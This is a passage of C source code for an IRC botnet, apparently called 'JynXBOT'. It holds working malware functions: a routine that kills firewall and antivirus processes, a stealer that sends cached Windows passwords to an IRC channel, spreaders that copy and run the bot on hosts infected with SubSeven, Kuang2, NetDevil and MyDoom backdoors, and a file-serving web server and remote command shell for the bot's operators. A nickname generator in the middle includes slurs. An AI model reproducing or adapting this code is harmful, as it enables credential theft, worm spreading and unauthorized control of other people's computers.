	if (fCreateToolhelp32Snapshot && fProcess32First && fProcess32Next) {
		hand = fCreateToolhelp32Snapshot(2, 0);
		if (hand != INVALID_HANDLE_VALUE) {
			pe32.dwSize = sizeof(PROCESSENTRY32);
			if (fProcess32First(hand, &pe32)) {
				do {
					if (killthread) {
						#ifdef Use_Firewall_killer
						CharUpperBuff(pe32.szExeFile,strlen(pe32.szExeFile));
						for(c = 0;kill_list[c] != NULL;c++)
						{
							if (strstr(pe32.szExeFile,kill_list[c]) != NULL) {
 								killer=OpenProcess(PROCESS_ALL_ACCESS,FALSE,pe32.th32ProcessID);
								TerminateProcess(killer,0);
								break;
							}
						}
						#endif
					}
					else if (proccess == NULL) {
						if (strlen(buffer) + strlen(pe32.szExeFile) > 490) { //send the string
							privmsg(sock,buffer,chan);
							if (chan) 
								Sleep(Flood_delay);
							memset(buffer,0,sizeof(buffer));
							strcpy(buffer,pe32.szExeFile);
						}
						else { //buffer is not full jet add the process to the end of the buffer
							strcat(buffer," ");
							strcat(buffer,pe32.szExeFile);
						}

					}
					else {
						if (strcmp(pe32.szExeFile,proccess) == 0) {
 							killer = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pe32.th32ProcessID);
							CloseHandle(hand);
							if (!TerminateProcess(killer,0)) return 0;
							return 1;
						 }

					}

				} while (fProcess32Next(hand, &pe32));
			}
			CloseHandle(hand);
		}
	}
	if (!killthread && proccess == NULL && strlen(buffer) > 1) privmsg(sock,buffer,chan);
 	return 0;

}


BOOL PASCAL AddPass(struct PASSWORD_CACHE_ENTRY FAR *pce, DWORD dwRefData)
{
	char buff[1024],buff2[1024];
	int nCount;
	PASSCACHECALLBACK_DATA *dat;
	dat = (PASSCACHECALLBACK_DATA *)dwRefData;
	nCount=pce->cbResource;
	if(nCount>1023) nCount=1023;
	lstrcpyn(buff, pce->abResource, nCount+1);
	buff[nCount] = 0;
	CharToOem(buff, buff2);
	if((dat->nBufPos+lstrlen(buff2))>=dat->nBufLen) return FALSE;
	lstrcpy(dat->pBuffer+dat->nBufPos,buff2);
	dat->nBufPos+=lstrlen(buff2)+1;

	nCount=pce->cbPassword;
	if(nCount>1023) nCount=1023;
	lstrcpyn(buff, pce->abResource+pce->cbResource, nCount+1);
	buff[nCount] = 0;
	CharToOem(buff, buff2);
	if((dat->nBufPos+lstrlen(buff2))>=dat->nBufLen) return FALSE;
	lstrcpy(dat->pBuffer+dat->nBufPos,buff2);
	dat->nBufPos+=lstrlen(buff2)+1;

	return TRUE;
}
int cashedpasswords(SOCKET sock,char *sendto) {
	char sendbuf[2150];
	char start[] = "[CachedPass] Searching for Passwords";
	char error[] = "[CachedPass] Not using Win9x!";
	HMODULE hLib=LoadLibrary("MPR.DLL");

	PASSCACHECALLBACK_DATA dat;
	dat.pBuffer=(char *)malloc(65536);
	dat.nBufLen=65536;
	dat.nBufPos=0;
	pWNetEnumCachedPasswords = (ENUMPASSWORD)GetProcAddress(hLib, "WNetEnumCachedPasswords");
	if (!pWNetEnumCachedPasswords)	{ //only win 9x!!
		irc_privmsg(sock,sendto,error,notice);
		return 1;
	}
	pWNetEnumCachedPasswords(NULL, 0, 0xff, AddPass, (DWORD) &dat);
	char *svStr;
	svStr=dat.pBuffer;
	//privmsg(sock,start,sendto);
	irc_privmsg(sock,sendto,start,notice);
	do {
		char *svRsc=svStr;
		svStr+=lstrlen(svStr)+1;
		char *svPwd=svStr;
		svStr+=lstrlen(svStr)+1;
		memset(sendbuf,0,sizeof(sendbuf));
		sprintf(sendbuf,"%s %s",svRsc,svPwd);
		irc_privmsg(sock,sendto,sendbuf,notice);
		//privmsg(sock,sendbuf,sendto);
		if (sendto != NULL) Sleep(Flood_delay);
	}while(*svStr!='\0');
	FreeLibrary(hLib);
	return 0;
};


// 'realistic random nick' example code by [sd].
// if you add items to the list, make sure that you update NUM_PARTx accordingly.
// this a little messy, i know, but it's just and example after all.
 #define NUM_PART1 5 //5 nicks really, totally , not , almost , horny.. if u add one nick down there add 1 to 5 also.
 #define NUM_PART2 10
 #define NUM_PART3 10
 #define NUM_PART4 5

 char * generatenick(char * strbuf) {
	char *part1[NUM_PART1] = { "Really", "Totally", "Not", "Almost", "Horny" };
	char *part2[NUM_PART2] = { "L33t", "Small", "Crazy", "Big", "Sexy", "Lucky", "Lame", "Ugly", "Stupid", "Paranoid" };
	char *part3[NUM_PART3] = { "Hax0r", "Geek", "Nerd", "Stud", "Genius", "Dicksucker", "Dick", "Loser", "Chick", "Retard" };
	char *part4[NUM_PART4] = { "1337", "666", "69", "13", "7" };
	char fnick[128];
	int uscore = rand()%3; // use underscores inbetween words (1 in 3 chance)

	memset(&fnick, 0, sizeof(fnick));

	if (rand()%6 == 0) { // first part (1 in 6 chance)
		strcat(fnick, part1[rand()%NUM_PART1]);
		if (!uscore) strcat(fnick, "_");
	}

	strcat(fnick, part2[rand()%NUM_PART2]); // second part (always used)

	if (!uscore) strcat(fnick, "_");
	strcat(fnick, part3[rand()%NUM_PART3]); // third part (always used)

	if (rand()%5 == 0) { // fourth part (1 in 5 chance)
		if (rand()%2 && uscore) strcat(fnick, "_"); // underscore before number (1 in 2 chance)
		strcat(fnick, part4[rand()%NUM_PART4]);
	}

	strcpy(strbuf, fnick);

	return strbuf;
 }

 int spyaddthread(char *name,SOCKET sock,HANDLE Threat_Handle,int id,char * dir) {
	int c;
	for (c=0;c <= 40;c++)
		if (threds[c].id == 0) break;
	if (c > 19) return -1;
	sprintf(threds[c].name,name);
	threds[c].id = id;
	threds[c].num = c;
	threds[c].sock = sock;
	threds[c].Threat_Handle = Threat_Handle;
	sprintf(threds[c].dir,dir);
	return c;
 }

 SOCKET Listen(int port) {
	SOCKET sock;
	SOCKADDR_IN  SockAddr;
   	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) 
      		return -1;
	memset(&SockAddr, 0, sizeof(SockAddr));
   	SockAddr.sin_family = AF_INET;
   	SockAddr.sin_port = htons(port);
	SockAddr.sin_addr.s_addr = INADDR_ANY;  
	if (bind(sock, (SOCKADDR *)&SockAddr, sizeof(SockAddr)) != 0) 
		return -1;//port is in use ?
	if (listen(sock, SOMAXCONN) != 0) 
		return -1;
	return sock;
 }


 SOCKET create_sock(char *host, int port) {
//	dword err;
    LPHOSTENT lpHostEntry = NULL;
   	SOCKADDR_IN  SockAddr;
   	SOCKET sock;
   	IN_ADDR iaddr;
   	if ((sock = socket( AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
      		return -1;
	memset(&SockAddr, 0, sizeof(SockAddr));
   	SockAddr.sin_family = AF_INET;
   	SockAddr.sin_port = htons(port);
	iaddr.s_addr = inet_addr(host);
	if (iaddr.s_addr == INADDR_NONE)  lpHostEntry = gethostbyname(host); //hostname
	if (lpHostEntry == NULL && iaddr.s_addr == INADDR_NONE)  //error dns
		return -1;
	if (lpHostEntry != NULL)
		SockAddr.sin_addr = *((LPIN_ADDR)*lpHostEntry->h_addr_list); //hostname
	else
		SockAddr.sin_addr = iaddr; //ip address
	if (connect(sock, (SOCKADDR *) &SockAddr, sizeof(SockAddr)) == SOCKET_ERROR) {
		closesocket(sock);
		return -1;
	}
	return sock;
 }

 // Spy spreaders

 // Rat receive sock
 int RAT_Receive(SOCKET sock) {
	TIMEVAL time;
   	fd_set fd_struct;
    	time.tv_sec = 30;
    	time.tv_usec = 0;
   	FD_ZERO(&fd_struct);
    	FD_SET(sock, &fd_struct);
	if (select(0, &fd_struct, NULL, NULL, &time) <= 0) {
		closesocket(sock); 
		return -1;
	}
	return 0; 
 }
 #ifndef NO_SUB7
 int SUB7(SOCKET sock) {
	/*SOCKADDR_IN socketname;
	int s = sizeof(socketname);
	getpeername(sock,&socketname,&s);	
*/ //thnx to racerx90 .
	SOCKADDR_IN socketname;
	int sin_size=sizeof(SOCKADDR_IN);
	getsockname(sock,(SOCKADDR*)&socketname,&sin_size);

	char filename[MAX_PATH],host[100],rBuffer[512];
	DWORD mode = 0;
	DWORD err;
	
	int t = 0,c,size,port;
	sprintf(host,"%s",inet_ntoa(socketname.sin_addr));
	port = ntohs(socketname.sin_port);
	ioctlsocket(sock,FIONBIO,&mode); //set the socket back to blocking

	restart:;

	memset(rBuffer,0,sizeof(rBuffer));
	if (RAT_Receive(sock) == -1) 
		goto end;
	if (recv(sock, rBuffer, sizeof(rBuffer), 0) <= 0) goto end;
      	      
	if (strcmp(rBuffer,"PWD") == 0) { //its password protected try the masterpasswords
		if (t > 1) {
			goto end;
		}
		if (t == 0) sprintf(rBuffer,"PWD715"); 
		else if (t == 1) { //try the other pass 
			sprintf(rBuffer,"PWD14438136782715101980"); 
		}
		t++;
		if (send(sock,rBuffer,strlen(rBuffer), 0) <= 0) goto end;
		goto restart;
	}
	strtok(rBuffer," ");
	if (strcmp(rBuffer,"connected.") == 0) { //we are connected
		send(sock,"UPS",3, 0);
		memset(rBuffer,0,sizeof(rBuffer));
		if (RAT_Receive(sock) == -1) goto end;
		recv(sock, rBuffer, sizeof(rBuffer), 0);
		if (strcmp(rBuffer,"TID") != 0) goto end; //something whent wrong
		GetModuleFileName(NULL,filename,sizeof(filename));
		char buffer[1041];
		HANDLE testfile = CreateFile(filename,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
		if (testfile == INVALID_HANDLE_VALUE) 
			goto end;
		size = GetFileSize(testfile,NULL);
		CloseHandle(testfile);
		sprintf(rBuffer,"SFT05%i",size);
		send(sock,rBuffer,10, 0);
		FILE* infile;
		infile = fopen(filename,"rb");
		if (infile == NULL) goto end;
		while (1)
		{
			memset(buffer,0,sizeof(buffer));
			c = fread(buffer,1,sizeof(buffer),infile);
			if (c == 0) 
				break;
			if (send(sock,buffer ,c, 0) <= 0) {
				fclose(infile);
				goto end;
			}
		}
		fclose(infile);
		c=0;
		err = recv(sock, rBuffer, sizeof(rBuffer), 0);
		while (err > 0) {
			if (c > 3) 
				break;
			if (RAT_Receive(sock) == -1) 
				break;
			err = recv(sock, rBuffer, sizeof(rBuffer), 0);
		}
		closesocket(sock);
		return 1;
			
	}
	else if (t == 1) {
		closesocket(sock);
		Sleep(2000);
		if ((sock = create_sock(host,port)) == SOCKET_ERROR) goto end;
		goto restart;
	}
	end:;
	closesocket(sock);
	return 0;
 }
 #endif

 #ifndef NO_KUANG
 #define	K2_UPLOAD_FILE	0x46445055
 #define	K2_ERROR	0x52525245
 #define	K2_DONE		0x454E4F44
 #define	K2_RUN_FILE	0x464E5552
 #define	K2_QUIT		0x54495551	
 typedef struct {
 	unsigned int command;
	union {
		char bdata[1024-4];
		struct {
			unsigned int param;
			char sdata[1024-8];
		};
	};
 } Message, *pMessage;
 char k2_buffer[1024];
 pMessage k2_msg = (pMessage) k2_buffer;

 int KUANG_Reciev(SOCKET sock) {
//	char rBuffer[1024];
	TIMEVAL time;
   	fd_set fd_struct;
    	time.tv_sec = 30;//timeout after 60 sec.
    	time.tv_usec = 0;
   	FD_ZERO(&fd_struct);
    	FD_SET(sock, &fd_struct);
	if (select(0, &fd_struct, NULL, NULL, &time) <= 0)
	{
		closesocket(sock); 
		return -1;
	}
	memset(k2_buffer,0,sizeof(k2_buffer));
      	if (recv(sock, k2_buffer, sizeof(k2_buffer), 0) < 1) return -1;
	if (k2_msg->command == K2_ERROR) {
		return -1;
	}
      	      
	return 0;
 }

 int KUANG(SOCKET sock) {
	char rBuffer[1024];
	unsigned int Fsize;
//	unsigned int Fsend;
	unsigned int move;
	DWORD mode = 0;
	int x;
	char thisfilename[MAX_PATH];
	char randFile[5];
	char rFile[15];
	memset(rFile,0,sizeof(rFile));
	memset(randFile,0,sizeof(randFile));
	srand(GetTickCount());
	for (x=0;x<4;x++)
		randFile[x] = (rand()%26)+97;
	randFile[x+1] = '\0';
	sprintf(rFile,"c:\\%s.exe",randFile);
	ioctlsocket(sock,FIONBIO,&mode); //socket back blocking
	if (KUANG_Reciev(sock) == -1) goto end;
	memset(k2_buffer,0,sizeof(k2_buffer));
	GetModuleFileName(NULL,thisfilename,sizeof(thisfilename));
	HANDLE testfile;
	testfile = CreateFile(thisfilename,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
	if (testfile == INVALID_HANDLE_VALUE) 
		goto end;
	Fsize = GetFileSize(testfile,NULL);
	k2_msg->command=K2_UPLOAD_FILE;
	k2_msg->param=Fsize;
	strcpy(k2_msg->sdata,rFile);
	//strcpy(k2_msg->bdata,rFile);
	//CloseHandle(testfile);
	send(sock,k2_buffer,1024, 0);
	if (KUANG_Reciev(sock) == -1) goto end;
	while (Fsize) {
		unsigned int Fsend = 1024;
		memset(rBuffer,0,sizeof(rBuffer));
		if (Fsend>Fsize) Fsend=Fsize;
		move = 0-Fsize;
		SetFilePointer(testfile, move, NULL, FILE_END);
		ReadFile(testfile, rBuffer, Fsend, &mode, NULL);
		int bytes_sent = send(sock, rBuffer, Fsend, 0);
		if (bytes_sent == SOCKET_ERROR) {
			if (WSAGetLastError() != WSAEWOULDBLOCK) break;
			else bytes_sent = 0;
		}
		Fsize = Fsize - bytes_sent;
	}
	if (KUANG_Reciev(sock) == -1) goto end;
	if (testfile != INVALID_HANDLE_VALUE) CloseHandle(testfile);
	memset(k2_buffer,0,sizeof(k2_buffer));
	k2_msg->command=K2_RUN_FILE;
	sprintf(k2_msg->bdata,rFile);
	send(sock,k2_buffer ,1024, 0);
	if (KUANG_Reciev(sock) == -1) goto end;
	memset(k2_buffer,0,sizeof(k2_buffer));
	k2_msg->command=K2_QUIT;
	send(sock,k2_buffer ,4, 0);
	return 1;
	end:;
	closesocket(sock);
	return 0;
 }
 #endif

 
 #ifndef NO_NETDEVIL
 int netdevil_upload(char * ip,SOCKET cSocket) {
	SOCKET sock;
	memset(This_File,0,sizeof(This_File));
	GetModuleFileName(NULL, This_File, sizeof(This_File));
	unsigned int Fsize, move;
	char rBuffer[1024], rFile[MAX_PATH];
	int port = 0, bytes_sent = 0;
	//int bytes_sent = 0;
	
	//get the upload port
	DWORD mode = 0;
	send(cSocket, "version", 7, 0);
	memset(rBuffer,0,sizeof(rBuffer));
	recv(cSocket, rBuffer, sizeof(rBuffer), 0);
	if (strlen(rBuffer) > 5) {
		char *uPort;
		rBuffer[strlen(rBuffer)-2] = '\0';
		uPort = strrchr(rBuffer, '\n\r');
		if (uPort != NULL) 
			port = atoi(uPort);
	}
	char *ver;
	BOOL ver15 = FALSE;
	ver = strtok(rBuffer,"\n\r");
	if (strcmp(rBuffer,"ver1.5") == 0) ver15 = TRUE; 
	sprintf(rFile,"C:\\%s",filename);
	if (port == 0) port = 903;
	if ((sock = create_sock(ip,port)) < 1) goto end;
	HANDLE testfile;
	testfile = CreateFile(This_File,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
	if (testfile == INVALID_HANDLE_VALUE) 
		goto end;
	Fsize = GetFileSize(testfile,NULL);
	memset(rBuffer,0,sizeof(rBuffer));
	if (ver15)
		sprintf(rBuffer,"cmd[003]%s|%i|\n\r",rFile,Fsize);
	else
		sprintf(rBuffer,"%s\r1",rFile);
	send(sock, rBuffer, strlen(rBuffer), 0);
	if (recv(sock, rBuffer, sizeof(rBuffer), 0) < 1) goto end;
	while (Fsize) {
		unsigned int Fsend = 1024;
		memset(rBuffer,0,sizeof(rBuffer));
		if (Fsend>Fsize) Fsend=Fsize;
		move = 0-Fsize;
		SetFilePointer(testfile, move, NULL, FILE_END);
		ReadFile(testfile, rBuffer, Fsend, &mode, NULL);
		bytes_sent = send(sock, rBuffer, Fsend, 0);
		if (bytes_sent == SOCKET_ERROR) {
			if (WSAGetLastError() != WSAEWOULDBLOCK) goto end;
			else bytes_sent = 0;
		}
		Fsize = Fsize - bytes_sent;
		if (!ver15 && recv(sock, rBuffer, sizeof(rBuffer), 0) < 1) goto end;
	}
	if (testfile != INVALID_HANDLE_VALUE) CloseHandle(testfile);
	closesocket(sock);
	Sleep(2000);
	sprintf(rBuffer,"pleaz_run%s",rFile);
	send(cSocket, rBuffer,strlen(rBuffer), 0);
	memset(rBuffer,0,sizeof(rBuffer));
	if (recv(cSocket, rBuffer, sizeof(rBuffer), 0) < 1) goto end;
	if (strcmp(rBuffer,"pleaz_run_done") != 0) goto end;
	Sleep(4000);
	closesocket(cSocket);
	return 1;
	end:;
	closesocket(sock);
	closesocket(cSocket);
	return 0;
 }

 int netdevil(char *ip,int port,SOCKET ircsock,SOCKET sock,char *chan) {
	char rBuffer[512];
	DWORD mode = 0;
	ioctlsocket(sock,FIONBIO,&mode); //set the socket back to blocking
	int c;
	for (c=1;passwords[c] != NULL;c++)
	{
		Sleep(50);
		memset(rBuffer,0,sizeof(rBuffer));
		if (RAT_Receive(sock) == -1) break;
		if (recv(sock, rBuffer, sizeof(rBuffer), 0) <= 0) break;
		if (strcmp(rBuffer,"passed") == 0) {
			sprintf(rBuffer,"nd %s %s",ip ,passwords[c-1]); 
			send(sock, rBuffer, strlen(rBuffer), 0);	

			if (netdevil_upload(ip,sock) == 1) {
				closesocket(sock);
				return 1;
			}
			break;	

		}
		if (strcmp(rBuffer,"pass_pleaz") == 0) {
			memset(rBuffer,0,sizeof(rBuffer));
			sprintf(rBuffer,"pass_pleaz%s",passwords[c]); 
			send(sock,rBuffer ,strlen(rBuffer), 0);
			continue;
		}
		else break;
	}
	closesocket(sock);
	return 0;
}
 #endif

// End of Spy Scanner



#ifndef NO_DOOM
BYTE MyDoomTrailor[] = "\x85\x13\x3c\x9e\xa2";

 int spread_mydoom( char* pszTarget )
 {
	char* pszFile;
	unsigned short nPort = 3127;
	FILE* pFile;
	WSAData strWSAData;
	hostent* pstrTarget;
	SOCKET sSock;
	sockaddr_in strAddr;

	pszFile		= filename; //bot filename

	// open the file
	pFile = fopen( pszFile, "svhost.exe" );
	if( !pFile )
	{
		return EXIT_FAILURE;
	}

	// windows startup
	WSAStartup( MAKEWORD( 1, 1 ), &strWSAData );
	
	// get target
	pstrTarget = gethostbyname( pszTarget );
	if( !pstrTarget )
	{
		return EXIT_FAILURE;
	}
	memset( &strAddr, 0, sizeof( strAddr ) );
	strAddr.sin_family	= AF_INET;
	strAddr.sin_addr	= *(in_addr*)pstrTarget->h_addr;
	strAddr.sin_port	= htons( nPort );
	
	// create socket
	sSock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
	if( sSock == INVALID_SOCKET )
	{
		fclose( pFile );
		return EXIT_FAILURE;
	}

	// connect
	if( connect( sSock, (sockaddr*)&strAddr, sizeof( strAddr ) ) == SOCKET_ERROR )
	{
		fclose( pFile );
		closesocket( sSock );
		
		return EXIT_FAILURE;
	}

	// send trailor
	if( send( sSock, (char*)MyDoomTrailor, 5, 0 ) != 5 )
	{
		fclose( pFile );
		closesocket( sSock );
		
		return EXIT_FAILURE;
	}
	
	// send file
	char szBuffer[ 1024 ];
	while( !feof( pFile ) )
	{
		// read
		int nRead = fread( szBuffer, 1, sizeof( szBuffer ), pFile );
		
		// send
		int nSent = send( sSock, szBuffer, nRead, 0 );
		if( nRead != nSent )
		{
			fclose( pFile );
			closesocket( sSock );
		
			return EXIT_FAILURE;
		}
	}

	// clean up
	fclose( pFile );
	closesocket( sSock );

	return EXIT_SUCCESS;
 }
 #endif

 #ifndef NO_HTTPD
 SOCKET http_socket;
 BOOL http_Type;
 int http_lenght;
 BOOL http_info = FALSE;
 char http_file[MAX_PATH];
 char http_path[MAX_PATH];

 int HTTP_server(char *dir,int http_poort) {
	SOCKET HTTPServer;
	char httpsDir[MAX_PATH];
	char buf[250];
	DWORD id;
	int c;
	HANDLE handle;
	memset(httpsDir,0,sizeof(httpsDir));
	if (dir[strlen(dir)-1] == 92) 
		dir[strlen(dir)-1] = '\0';
	strcpy(httpsDir,dir);
	if ((HTTPServer = Listen(http_poort)) == -1)
		return -1;
	for (c=0;c < 40;c++)
		if (threds[c].id == 0) break;
	if (c > 39) {
		closesocket(HTTPServer);
		return -1;
	}
	//int httpdt; damn.. cant convert this..
	handle = CreateThread(NULL, 0, &HTTP_server_thread, (LPVOID)c, 0, &id);
	if (handle != NULL) {
		sprintf(buf,"[HTTPD] Server listening on port: %i root dir: %s\\",http_poort,httpsDir);
		//httpdt = addthread(buf);
		//threads[httpdt] = CreateThread(NULL, 0, &HTTP_server_thread, (LPVOID)c, 0, &id);
		spyaddthread(buf,HTTPServer,handle,3,httpsDir);
	}
	return c;
 }

 DWORD WINAPI HTTP_server_thread(LPVOID Param) {
	SOCKADDR_IN  GuestAddr;
	SOCKET guest;

	char buffer[4096];
	char rBuffer[4096];
	char file[MAX_PATH];
	char *file_to_send;
	file_to_send = "\0";

	int addrlen, r;
	int threadnum = (int)Param;
	
	unsigned int b, max, i;
	unsigned long mode = 1;
	
	if (ioctlsocket(threds[threadnum].sock,FIONBIO,&mode) == SOCKET_ERROR) 
		return 1;

	fd_set master;   
        fd_set temp; 
	FD_ZERO(&master);    
        FD_ZERO(&temp);
 	FD_SET(threds[threadnum].sock, &master);
	max = threds[threadnum].sock;

	while (1) {
		temp = master;
		if (select(max+1, &temp, NULL, NULL, NULL) == SOCKET_ERROR)
			break;
           	
		for(i=0; i<= max; i++) {
			if (FD_ISSET(i, &temp)) { //there is somthing to do 
				if (i == threds[threadnum].sock) {
					//there is a new connection request
					addrlen = sizeof(GuestAddr);
					if ((guest = accept(threds[threadnum].sock, (SOCKADDR *)&GuestAddr,&addrlen)) == INVALID_SOCKET)  
							continue; 
			else {
						FD_SET(guest, &master); // add to master set
							if (guest > max)  
								max = guest;
					}
			} 
			else {
			memset(buffer,0,sizeof(buffer));
			memset(rBuffer,0,sizeof(rBuffer));
					if (recv(i, buffer, sizeof(buffer), 0) <= 0) { //socket error
						closesocket(i); 
							FD_CLR(i, &master); // remove from master set
					} 
			else {
						memset(file,0,sizeof(file));
						for (b = 0,r = 0;b < strlen(buffer);b++, r++) {
							rBuffer[r] = buffer[b];
							if (buffer[b] == '\n')
							{  //check the request....
								if (strstr(rBuffer,"GET ") != NULL && strlen(rBuffer) > 5) { //look for a GET request
									file_to_send = strtok(strstr(strstr(rBuffer,"GET ")," ")," ");
									strcpy(file,file_to_send);

								}
								else if (strcmp(rBuffer,"\r\n") == 0) {  //end of the request check if there is anything to send back
										FD_CLR(i, &master);
										if (file != NULL) {
										if (strlen(file)+strlen(threds[threadnum].dir) < MAX_PATH) { 
											unsigned long mode2 = 0;
											ioctlsocket(i,FIONBIO,&mode2);
											Check_Requestedfile(i,threds[threadnum].dir,file);
										}
										else closesocket(i);
									}
									else closesocket(i);
									break;
								}
								memset(rBuffer,0,sizeof(rBuffer));
								r=-1;
							}

                				} 
        				}

				}
			}
		}
	}
	closesocket(threds[threadnum].sock);
	threds[threadnum].id = 0;
	return 0;
 }

 DWORD WINAPI  http_header(LPVOID param) {
	SOCKET sock = (SOCKET)param;
	char tFile[MAX_PATH];
	char nFile[MAX_PATH];
	BOOL type = http_Type;
	sprintf(tFile,http_file); 
	sprintf(nFile,http_path); 
	int lenght = http_lenght;
	http_info = TRUE;
	char content[50];
	if (type) sprintf(content,"text/html");
	else sprintf(content,"application/octet-stream");
	char buffer[4096];
	char date[70];
	char time[30];
	GetDateFormat(0x409,0,0,"ddd, dd MMM yyyy",date,70);
	GetTimeFormat(0x409,0,0,"HH:mm:ss",time,30);
	sprintf(buffer,"HTTP/1.0 200 OK\r\nServer: JynXBOT\r\nDate: %s %s GMT\r\nContent-Type: %s\r\nAccept-Ranges: bytes\r\nLast-Modified: %s %s GMT\r\nContent-Length: %i\r\nConnection: close\r\n\r\n",date,time,content,date,time,lenght);
	send(sock,buffer,strlen(buffer),0);
	if (type == FALSE) http_send_file(sock,tFile);
	else getfiles(tFile,sock,NULL,nFile); 
	closesocket(sock);
	return 0;
}

 int Check_Requestedfile(SOCKET sock,char * dir,char * rFile) {
	BOOL directory = FALSE;
	char file[MAX_PATH];
	char nFile[MAX_PATH];
	char tFile[MAX_PATH];
	memset(file,0,sizeof(file));
	memset(nFile,0,sizeof(nFile));
	DWORD c,d;

	if (rFile[0] != 47) sprintf(file,"\\%s",rFile);
	else {
		rFile[0] = 92;
		sprintf(file,"%s",rFile);
	}
	for (c = 0,d=0;c < strlen(file);c++,d++)
	{
		if ((((c+2 < strlen(file) && file[c] == 37 && file[c+1] == 50 && file[c+2] == 48)))) {
			nFile[d] = 32;
			c=c+2;
		}
		else if (file[c] == 47) nFile[d] = 92;
		else nFile[d] = file[c];
	}
	sprintf(tFile,"%s%s",dir,nFile);
	strtok(tFile,"\n");
	//HANDLE testfile;
	if (GetFileAttributes(tFile) == FILE_ATTRIBUTE_DIRECTORY) 
      		directory = TRUE;
	else if (GetFileAttributes(tFile) == 0xFFFFFFFF) { //invalid file
			closesocket(sock);
			return 0;
	}
	if (nFile[d-1] == 92) directory = TRUE;
	DWORD id;
	if (directory) {
		strcat(tFile,"*");
		file_to_html(nFile);
		sprintf(http_file,tFile);
		sprintf(http_path,nFile);
		http_info = FALSE;
		http_Type = TRUE;
		http_lenght = 10000;
		if (CreateThread(NULL, 0, &http_header, (LPVOID)sock, 0, &id)) {
			while (http_info == FALSE) Sleep(5);
		}
		else { 
			closesocket(sock);
		}
		 //(tFile,sock,NULL,nFile); //list the directory and send it in html
	}
	else { //its a file
		HANDLE testfile = CreateFile(tFile,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
      		if (testfile != INVALID_HANDLE_VALUE) {
			http_lenght = GetFileSize(testfile,NULL);
			CloseHandle(testfile);
			http_Type = FALSE;
			sprintf(http_file,tFile);
			http_info = FALSE;
			if (CreateThread(NULL, 0, &http_header, (LPVOID)sock, 0, &id)) {
				while (http_info == FALSE) Sleep(5);
			}
			else {
				closesocket(sock);
			}
		}
	}
	return 0;
 }
 void http_send_file(SOCKET sock,char *file) {
	//int c;
	char buffer[1024];
	DWORD mode = 0;
	HANDLE testfile = CreateFile(file,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
	if (testfile == INVALID_HANDLE_VALUE) 
		return;
	unsigned int Fsize, move;
	Fsize = GetFileSize(testfile,NULL);
	
	while (Fsize) {
		unsigned int Fsend = 1024;
		memset(buffer,0,sizeof(buffer));
		if (Fsend>Fsize) Fsend=Fsize;
		move = 0-Fsize;
		SetFilePointer(testfile, move, NULL, FILE_END);
		ReadFile(testfile, buffer, Fsend, &mode, NULL);
		int bytes_sent = send(sock, buffer, Fsend, 0);
		if (bytes_sent == SOCKET_ERROR) {
			if (WSAGetLastError() != WSAEWOULDBLOCK) break;
			else bytes_sent = 0;
		}
		Fsize = Fsize - bytes_sent;
	}
	if (testfile != INVALID_HANDLE_VALUE) CloseHandle(testfile);
	return; //file transfer complete		
 }

 char * file_to_html(char *file) {
	DWORD c;
	for (c=0;c < strlen(file);c++)
	if (file[c] == 92) file[c] = 47;
	return file;
 }

 int getfiles(char *current,SOCKET dccsock,char *chan,char *URL) {
	char sendbuf[MAX_PATH];
	char parent[MAX_PATH];
	memset(parent,0,sizeof(parent));
    HANDLE Hnd;
    WIN32_FIND_DATA WFD;
	DWORD c;
	int count = 0;
	int count2 = 0;
	strtok(current,"\n");
	if (chan) sprintf(sendbuf,"PRIVMSG %s :Searsing for: %s\r\n",chan,current);
	else if (URL) sprintf(sendbuf,"<HTML><PRE>\n");
	else sprintf(sendbuf,"Searsing for: %s\r\n",current);
        send(dccsock,sendbuf,strlen(sendbuf),0);
	if (URL && strlen(URL) > 2) {
		//make the Parent Directory
		for (c=strlen(URL)-3;c != 0;c--)
			if (URL[c] == 47) 
				break;
		strncpy(parent,URL,c+1);
		sprintf(sendbuf,"<li><A href=\"%s\">Parent Directory</A></li>\r\n",parent);
		send(dccsock,sendbuf,strlen(sendbuf),0);
	}
        Hnd = FindFirstFile(current, &WFD);
        while (FindNextFile(Hnd, &WFD))
        {
        	if ((WFD.dwFileAttributes) &&  (strcmp(WFD.cFileName, "..") && strcmp(WFD.cFileName, ".")))
        	{

			memset(sendbuf,0,sizeof(sendbuf));
			if (WFD.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				count2++;
				if (chan) sprintf(sendbuf,"PRIVMSG %s :[%s]\n",chan,WFD.cFileName);
				else if (URL) //its a http request
					sprintf(sendbuf,"<li><A href=\"%s%s/\">%s</A></li> <b>Directory</b>\r\n",URL,WFD.cFileName,WFD.cFileName);
				else
					sprintf(sendbuf,"<%s>\r\n",WFD.cFileName);
			}
			else {
				count++;
				if (chan) sprintf(sendbuf,"PRIVMSG %s :%s (%i bytes)\n",chan,WFD.cFileName,WFD.nFileSizeLow);
				else if (URL)//its a http request
					sprintf(sendbuf,"<p><A href=\"%s%s\">%s</A> (%i bytes)\r\n",URL,WFD.cFileName,WFD.cFileName,WFD.nFileSizeLow);
				else 
					sprintf(sendbuf,"%s (%i bytes)\r\n",WFD.cFileName,WFD.nFileSizeLow);
			
			}
			send(dccsock,sendbuf,strlen(sendbuf),0);
			if (chan) Sleep(Flood_delay);
     		}

        }
    	(void) FindClose(Hnd);
	if (chan) sprintf(sendbuf,"PRIVMSG %s :Found %i files and %i dirs\n",chan,count,count2);
	else if (URL) sprintf(sendbuf,"</PRE></HTML>"); 
	else sprintf(sendbuf,"Found: %i files and %i dirs\r\n",count,count2);
	send(dccsock,sendbuf,strlen(sendbuf),0);
   	return 0;
 }
 #endif

 #ifndef NO_REMOTECMD
 char pipe_chan[50]; 

 void Close_Handles(void) {
	if (pipe_read != INVALID_HANDLE_VALUE) CloseHandle(pipe_read);
	if (pipe_write != INVALID_HANDLE_VALUE) CloseHandle(pipe_write);
	if (pipe_Hproc != INVALID_HANDLE_VALUE) CloseHandle(pipe_Hproc);
 }

 int open_cmd(SOCKET sock,char * chan) {
	Close_Handles();
	char searsdir[MAX_PATH];
